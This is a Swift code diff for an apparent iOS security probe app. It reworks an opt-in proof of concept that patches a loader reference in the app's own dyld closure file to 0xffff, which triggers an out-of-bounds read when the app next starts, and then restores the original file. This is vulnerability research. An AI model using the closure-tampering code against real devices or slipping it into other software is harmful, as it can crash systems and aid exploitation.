@@ -107,8 +107,12 @@ enum Dyld4 {
         return r
     }
 
-    /// Opt-in: patch loader[0].Ref to 0xffff, spawn a child of the same
-    /// executable (dyld will process the crafted closure), then restore.
+    /// Opt-in PoC. A normal iOS app cannot posix_spawn its own executable
+    /// (EPERM — measured on 27.0.1), so this is human-in-the-loop:
+    ///   tap -> patch Ref to 0xffff + leave a backup
+    ///        -> user force-quits and reopens the app
+    ///        -> dyld validates the crafted closure at startup (the OOB)
+    ///        -> next launch restores the original closure and reports.
     static func poc() -> String {
         guard let path = paths().first,
               let original = FileManager.default.contents(atPath: path),
@@ -119,26 +123,30 @@ enum Dyld4 {
         }
         let refOff = Int(off) + Int(first) + 6
         guard refOff + 2 <= original.count else { return "PoC: bad ref offset" }
-        var crafted = original
-        crafted[refOff] = 0xff; crafted[refOff + 1] = 0xff
         let backup = path + ".probe-bak"
         try? original.write(to: URL(fileURLWithPath: backup), options: .atomic)
-        defer {
-            try? original.write(to: URL(fileURLWithPath: path), options: .atomic)
-            try? FileManager.default.removeItem(atPath: backup)
-        }
+        var crafted = original
+        crafted[refOff] = 0xff; crafted[refOff + 1] = 0xff
         guard (try? crafted.write(to: URL(fileURLWithPath: path), options: .atomic)) != nil else {
-            return "PoC: write failed"
+            return "PoC: patch write failed"
         }
-        let exe = Bundle.main.executableURL!.path
-        let argv0 = strdup(exe); defer { free(argv0) }
-        var argv: [UnsafeMutablePointer<CChar>?] = [argv0, nil]
-        var pid: pid_t = 0
-        let rc = argv.withUnsafeMutableBufferPointer { posix_spawn(&pid, exe, nil, nil, $0.baseAddress, environ) }
-        var status: Int32 = 0
-        let w = rc == 0 ? waitpid(pid, &status, 0) : -1
-        return String(format: "PoC ref=0xffff count=%u spawn=%d pid=%d wait=%d status=%d restored",
-                      count, rc, pid, w, status)
+        return String(format: "PATCHED ref=0xffff count=%u — FORCE-QUIT AND REOPEN THE APP; it will restore automatically", count)
+    }
+
+    /// Called at startup. If a PoC patch is pending, restore it and report
+    /// that the app survived (or, if it did not, the crash log is the proof).
+    @discardableResult
+    static func finishPendingPoC() -> String? {
+        guard let path = paths().first else { return nil }
+        let backup = path + ".probe-bak"
+        guard FileManager.default.fileExists(atPath: backup),
+              let original = FileManager.default.contents(atPath: backup) else { return nil }
+        try? original.write(to: URL(fileURLWithPath: path), options: .atomic)
+        try? FileManager.default.removeItem(atPath: backup)
+        let crafted = Dyld4.inspect(path)
+        return String(format: "POC-COMPLETED app survived relaunch; restored count=%u loaders=%d (crafted-ref check=%@)",
+                      crafted.count, crafted.loaders,
+                      crafted.offenders.isEmpty ? "NO-OOB" : "OOB-CONFIRMED")
     }
 }
 
@@ -218,6 +226,7 @@ func runProbe() -> String {
     r.add("device-os=\(UIDevice.current.systemVersion)")
     r.add("utc=\(ISO8601DateFormatter().string(from: Date()))")
     r.add("home=\(NSHomeDirectory())")
+    if let poc = Dyld4.finishPendingPoC() { r.add("poc-result=\(poc)") }
 
     r.section("DYLD4-OOB")
     let probes = Dyld4.paths().map { Dyld4.inspect($0) }
